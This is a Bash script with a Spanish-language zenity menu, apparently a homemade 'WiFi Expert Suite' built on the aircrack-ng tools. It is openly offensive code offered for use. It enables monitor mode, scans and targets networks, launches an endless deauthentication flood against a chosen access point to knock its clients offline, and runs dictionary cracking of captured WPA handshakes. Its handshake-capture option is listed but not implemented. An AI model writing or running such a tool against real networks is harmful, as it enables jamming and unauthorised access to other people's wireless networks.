#!/bin/bash
# WiFi Expert Suite v7.0 - AUTOMATIC CRACK EDITION

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi Expert Suite ULTIMATE" \
        --column="ID" --column="Acción" --width=600 --height=500 \
        1 "⚡ Activar Modo Monitor (Check Kill)" \
        2 "🌐 Desactivar Modo Monitor (Internet)" \
        3 "📡 Escaneo General" \
        4 "🔍 Rastreo Específico" \
        5 "🔑 Capturar Handshake (Manual)" \
        6 "🔥 ATAQUE PERMANENTE (Bloqueo Total)" \
        7 "🔓 DESCIFRADO AUTOMÁTICO (Un solo clic)" \
        8 "❌ Salir")

    case $CHOICE in
        1) 
            pkexec airmon-ng check kill
            INT=$(zenity --entry --text="Interfaz (ej: wlan0):" --entry-text="wlan0")
            pkexec airmon-ng start $INT | zenity --text-info --width=400 --height=200
            ;;
        2)
            pkexec airmon-ng stop wlan0mon && pkexec systemctl restart NetworkManager
            notify-send "WiFi Suite" "Internet Restaurado"
            ;;
        3)
            gnome-terminal --title="ESCANEO" -- sh -c "sudo airodump-ng wlan0mon; exec bash"
            ;;
        4)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="RASTREO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL wlan0mon; exec bash"
            ;;
        6)
            BSSID=$(zenity --entry --text="BSSID a Bloquear:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            sudo aireplay-ng -0 0 -a $BSSID wlan0mon > /dev/null 2>&1 &
            ATAQUE_PID=$!
            ( while ps -p $ATAQUE_PID > /dev/null; do echo "100" ; echo "# ⚡ ATAQUE ACTIVO: $BSSID" ; sleep 2; done ) | zenity --progress --title="BLOQUEO" --auto-close
            sudo kill $ATAQUE_PID 2>/dev/null
            ;;
        7)
            # FUNCIÓN DE DESCIFRADO AUTOMÁTICO
            # Busca el archivo .cap más reciente en la carpeta actual
            RECENT_CAP=$(ls -t *.cap 2>/dev/null | head -n 1)
            
            if [ -z "$RECENT_CAP" ]; then
                zenity --error --text="No se encontraron archivos .cap en esta carpeta. Primero usa la Opción 5."
            else
                # Busca automáticamente el wordlist.txt
                if [ -f "wordlist.txt" ]; then
                    gnome-terminal --title="DESCIFRANDO AUTOMÁTICAMENTE" -- sh -c "echo 'Usando captura: $RECENT_CAP'; aircrack-ng -w wordlist.txt $RECENT_CAP; echo 'Presiona Enter para cerrar'; read"
                else
                    zenity --warning --text="No encontré 'wordlist.txt'. Por favor selecciónalo manualmente."
                    WORDLIST=$(zenity --file-selection --title="Selecciona Diccionario")
                    gnome-terminal --title="DESCIFRANDO" -- sh -c "aircrack-ng -w $WORDLIST $RECENT_CAP; read"
                fi
            fi
            ;;
        8) exit ;;
    esac
done
